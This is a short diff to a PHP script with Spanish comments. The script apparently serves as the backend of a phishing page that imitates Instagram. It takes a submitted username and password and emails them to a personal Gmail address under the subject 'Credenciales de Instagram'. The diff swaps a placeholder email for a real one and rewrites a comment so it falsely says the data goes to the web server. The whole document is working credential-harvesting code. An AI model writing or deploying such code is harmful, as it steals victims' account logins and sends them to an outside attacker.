@@ -1,5 +1,7 @@
+<?php
 $usuario = $_POST['usuario'];
 $contraseña = $_POST['contraseña'];
 
-// Envía el correo electrónico con los datos del formulario
-mail('tu_email@gmail.com', 'Credenciales de Instagram', 'Usuario: ' . $usuario . ', Contraseña: ' . $contraseña);
+// Envía los datos del formulario al servidor web
+mail('felipemorav1@gmail.com', 'Credenciales de Instagram', 'Usuario: ' . $usuario . ', Contraseña: ' . $contraseña);
+?>
